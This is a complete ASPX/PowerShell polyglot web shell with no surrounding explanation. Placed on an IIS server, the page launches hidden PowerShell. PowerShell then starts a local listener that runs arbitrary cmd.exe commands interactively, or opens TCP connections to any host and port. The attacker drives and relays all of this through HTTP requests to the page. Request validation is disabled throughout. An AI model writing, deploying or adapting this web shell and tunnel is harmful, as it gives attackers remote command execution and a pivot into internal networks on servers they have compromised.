<#
<%@
  Page Language="C#"
  ValidateRequest="false"
  EnableViewState="false"
%>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>
<%@ Import Namespace="System.IO" %>
<%
Response.Clear();

JavaScriptSerializer serializer = new JavaScriptSerializer();

Action<string> error = msg => {
    Response.ContentType = "application/json";
    if (msg != null) {
        Response.StatusCode = 403;
    } else {
        Response.StatusCode = 200;
    }
    Response.Write(serializer.Serialize(new Dictionary<String, String>() {{"error", msg}}));
    Response.End();
};

Func<HttpWebRequest, HttpWebResponse> GetResponse = request => {
    HttpWebResponse response = null;
    try {
        response = (HttpWebResponse)request.GetResponse();
    } catch (WebException exception) {
        if (exception.Status == WebExceptionStatus.ProtocolError) {
            response = (HttpWebResponse) exception.Response;
        } else {
            throw;
        }
    }
    return response;
};

if(Request.QueryString["action"]==null) {
    error("no action");
}

Guid uuid;
byte[] buffer;
String url;
HttpWebRequest req;
HttpWebResponse resp;

if(Request.QueryString["port"]==null) {
    if(Request.QueryString["param"]==null) {
        error("missing param");
    }
    uuid = Guid.NewGuid();
    switch (Request.QueryString["action"]) {
        case "cmd":
        case "connect":
            break;
        default:
            error("unexpected action");
            break;
    }

    using (Process proc = new Process()) {
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        proc.StartInfo.FileName = "powershell";
        proc.StartInfo.Arguments = String.Format(
                "-c gc {0} | Out-String | IEX ; Invoke-Proxy {1} {2} '{3}'",
                Request.PhysicalPath,
                Request.QueryString["action"],
                uuid,
                Request.QueryString["param"].Replace("'", "''")
        );
        proc.StartInfo.CreateNoWindow = true;
        proc.Start();
    }

    for (int i = 0; ; i++) {
        try {
            HttpWebResponse response = GetResponse(
                    WebRequest.CreateHttp(
                            String.Format(
                                    "http://localhost:55436/{0}/check",
                                    uuid)
                    )
            );
            if (response.StatusCode == HttpStatusCode.OK) {
                break;
            }
        } catch (WebException e) {}
        Thread.Sleep(1000);
        if (i >= 10) {
            error("failed self check");
        }
    }

    Response.StatusCode = 200;
    Response.ContentType = "application/json";
    Response.Write(
            serializer.Serialize(
                    new Dictionary<String, String>() {{"port", uuid.ToString()}}
            )
    );
    Response.End();
}

uuid = new Guid(Request.QueryString["port"]);
switch (Request.QueryString["action"]) {
    case "read":
        url = String.Format("http://localhost:55436/{0}/read", uuid);
        req = WebRequest.CreateHttp(url);
        req.Timeout = Timeout.Infinite;
        resp = GetResponse(req);
        if (resp.StatusCode == HttpStatusCode.OK && resp.ContentLength > 0) {
            buffer = new byte[resp.ContentLength];
            resp.GetResponseStream().Read(buffer, 0, buffer.Length);
            resp.Close();
            Response.StatusCode = 200;
            Response.ContentType = "application/octet-stream";
            Response.BinaryWrite(buffer);
            Response.End();
        } else if (resp.StatusCode == HttpStatusCode.NoContent && resp.ContentLength == 0) {
            resp.Close();
            Response.ContentType = "application/json";
            Response.StatusCode = 200;
            Response.Write(serializer.Serialize(new Dictionary<String, String>() {{"error", "timeout"}}));
            Response.End();
        } else {
            resp.Close();
            error("read failed");
        }
        break;
    case "write":
        if (Request.ContentLength == 0) {
            error("missing body");
        }
        buffer = new byte[Request.ContentLength];
        Request.InputStream.Read(buffer, 0, buffer.Length);
        url = String.Format("http://localhost:55436/{0}/write", uuid);
        req = WebRequest.CreateHttp(url);
        req.Method = "POST";
        req.ContentType = "application/octet-stream";
        req.ContentLength = buffer.Length;
        using (Stream s = req.GetRequestStream()) {
            s.Write(buffer, 0, buffer.Length);
        }
        resp = GetResponse(req);
        if (resp.StatusCode == HttpStatusCode.NoContent) {
            error(null);
        } else {
            error("write failed");
        }
        break;
    case "shutdown":
        try {
            url = String.Format("http://localhost:55436/{0}/shutdown", uuid);
            GetResponse(WebRequest.CreateHttp(url));
            error(null);
        } catch (WebException e) {
            error(e.ToString());
        }
        break;
    default:
        error("unexpected action");
        break;
}

Response.Write("grrrrre\n");
Response.End();
%>
#>

$ProxySource = @"
using System;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.ComponentModel;
using System.Threading;
using System.Net.Sockets;

public abstract class Proxy {
    protected abstract void Read(HttpListenerContext ctx);
    protected abstract void Write(HttpListenerContext ctx);
    protected abstract void Shutdown();
    public abstract bool Prepare(string arg);

    private void ReadCB(object state) {
        Read((HttpListenerContext)state);
    }

    public void Serve(int port, string uuid) {
        HttpListener http = new HttpListener();
        http.Prefixes.Add(string.Format("http://localhost:{0}/{1}/", port, uuid));
        http.Start();
        Console.WriteLine(
                "listener started on port {0} with code {1}", port, uuid);
        while (http.IsListening) {
            HttpListenerContext ctx = http.GetContext();
            Console.WriteLine(
                    "reqline [{0}] {1}",
                    ctx.Request.HttpMethod,
                    ctx.Request.Url.AbsolutePath
            );

            string[] path = ctx.Request.Url.AbsolutePath.Split('/');

            if (ctx.Request.HttpMethod == "POST") {
                if (path[path.Length - 1] == "write") {
                    if (
                            !ctx.Request.HasEntityBody ||
                            ctx.Request.ContentLength64 <= 0
                    ) {
                        ctx.Response.StatusCode = 204;
                        ctx.Response.Close();
                    } else {
                        Write(ctx);
                    }
                    continue;
                }
            }

            if (ctx.Request.HttpMethod == "GET") {
                if ("check" == path[path.Length - 1]) {
                    ctx.Response.StatusCode = 200;
                    ctx.Response.ContentType = "text/plain";
                    ctx.Response.ContentEncoding = Encoding.UTF8;
                    ctx.Response.ContentLength64 = 2;
                    ctx.Response.OutputStream.Write(
                            new byte[]{0x4f, 0x4b}, 0, 2);
                    ctx.Response.Close();
                    continue;
                } else if ("read" == path[path.Length - 1]) {
                    ThreadPool.QueueUserWorkItem(ReadCB,ctx);
                    continue;
                } else if ("shutdown" == path[path.Length - 1]) {
                    Shutdown();
                    Console.Write("shutting down");
                    ctx.Response.StatusCode = 204;
                    ctx.Response.Close();
                    http.Stop();
                    break;
                }
            }

            Console.WriteLine("Unhandled request");
            ctx.Response.StatusCode = 404;
            ctx.Response.Close();
        }
    }
}

public class CommandProxy : Proxy {
    private Process process;
    private IAsyncResult result = null;
    private byte[] readBuffer = new byte[65535];

    public override bool Prepare(string cmd) {
        process = new Process();
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.FileName = "cmd";
        process.StartInfo.Arguments = string.Format("/c {0} 2>&1", cmd);
        process.StartInfo.RedirectStandardInput = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.CreateNoWindow = true;

        try {
            if (!process.Start()) {
                Console.WriteLine("process failed to start");
                return false;
            }
        } catch (Win32Exception e) {
            Console.WriteLine("process failed to start: {0}", e);
            return false;
        }
        Console.WriteLine("process started");
        Console.WriteLine(process.StandardOutput.BaseStream.GetType());
        return true;
    }

    protected override void Read(HttpListenerContext ctx) {
        if (result == null) {
            result = process.StandardOutput.BaseStream.BeginRead(
                    readBuffer, 0, readBuffer.Length, null, null
            );
        }
        if (result.AsyncWaitHandle.WaitOne(5000)) {
            int l = process.StandardOutput.BaseStream.EndRead(result);
            if (l > 0) {
                ctx.Response.StatusCode = 200;
                ctx.Response.ContentLength64 = l;
                ctx.Response.OutputStream.Write(readBuffer, 0, l);
                ctx.Response.ContentType = "application/octet-stream";
            } else {
                ctx.Response.StatusCode = 404;
            }
            result.AsyncWaitHandle.Close();
            result = null;
        } else {
            ctx.Response.StatusCode = 204;
        }
        ctx.Response.Close();
    }

    protected override void Write(HttpListenerContext ctx) {
        if (process.HasExited) {
            ctx.Response.StatusCode = 404;
            ctx.Response.Close();
            return;
        }
        byte[] buffer = new byte[ctx.Request.ContentLength64];
        try {
            int l = ctx.Request.InputStream.Read(buffer, 0, buffer.Length);
            process.StandardInput.BaseStream.Write(buffer, 0, l);
            process.StandardInput.BaseStream.Flush();
            ctx.Response.StatusCode = 204;
            ctx.Response.Close();
        } catch {
            ctx.Response.StatusCode = 404;
            ctx.Response.Close();
        }
    }

    protected override void Shutdown() {
        try {
            process.StandardInput.BaseStream.Close();
            Thread.Sleep(1000);
            process.StandardOutput.BaseStream.Close();
        } finally {
            process.Close();
        }
    }

}

public class SocketProxy : Proxy {
    private Socket socket;
    private IAsyncResult result = null;
    private byte[] readBuffer = new byte[65535];

    public override bool Prepare(string endpoint){
        string[] parts = endpoint.Split(':');
        if (parts.Length != 2) {
            Console.WriteLine("bad endpoint format");
        }
        int port = Int32.Parse(parts[1]);
        try {
            socket = new Socket(
                    AddressFamily.InterNetwork,
                    SocketType.Stream,
                    ProtocolType.Tcp
            );
            socket.Connect(parts[0], port);
        } catch (SocketException e) {
            Console.WriteLine("unable to connect: {0}", e);
            return false;
        }
        return true;
    }

    protected override void Read(HttpListenerContext ctx) {
        if (result == null) {
            result = socket.BeginReceive(
                    readBuffer, 0, readBuffer.Length, 0, null, null
            );
        }
        if (result.AsyncWaitHandle.WaitOne(5000)) {
            try {
                int l = socket.EndReceive(result);
                result.AsyncWaitHandle.Close();
                result = null;
                if (l > 0) {
                    ctx.Response.StatusCode = 200;
                    ctx.Response.ContentLength64 = l;
                    ctx.Response.OutputStream.Write(readBuffer, 0, l);
                    ctx.Response.ContentType = "application/octet-stream";
                } else {
                    // case when other side has closed connection
                    ctx.Response.StatusCode = 404;
                    socket.Shutdown(SocketShutdown.Both);
                }
            } catch (SocketException) {
                ctx.Response.StatusCode = 404;
            } finally {
                ctx.Response.Close();
            }
        } else {
            ctx.Response.StatusCode = 204;
            ctx.Response.Close();
        }
    }

    protected override void Write(HttpListenerContext ctx) {
        byte[] buffer = new byte[ctx.Request.ContentLength64];
        int l = ctx.Request.InputStream.Read(buffer, 0, buffer.Length);
        try {
            socket.Send(buffer);
            ctx.Response.StatusCode = 204;
        } catch (SocketException) {
            // when other side has close connection
            ctx.Response.StatusCode = 404;
        } finally {
            ctx.Response.Close();
        }
    }

    protected override void Shutdown() {
        try {
            socket.Shutdown(SocketShutdown.Send);
            Thread.Sleep(1000);
            socket.Shutdown(SocketShutdown.Receive);
        } finally {
            socket.Close();
        }
    }
}

public static class ProxyFactory {
    public static Proxy CreateInstance(string name) {
        switch (name) {
            case "cmd":
                return new CommandProxy();
            case "connect":
                return new SocketProxy();
            default:
                throw new ArgumentOutOfRangeException("name");
        }
    }
}
"@

Add-Type $ProxySource

function Invoke-Proxy {
    Param(
        [Parameter(Mandatory=$true)]
        [string] $mode,
        [Parameter(Mandatory=$true)]
        [string] $uuid,
        [Parameter(Mandatory=$true)]
        [String] $param
    )
    Write-Host "mode: $mode"
    Write-Host "code: $uuid"
    Write-Host "param: $param"

    $Proxy = [ProxyFactory]::CreateInstance($mode);
    if ($Proxy.Prepare($param)) {
        $Proxy.Serve(55436, $uuid);
    } else {
        Write-Error "Proxy initilisation failed"
    }
}
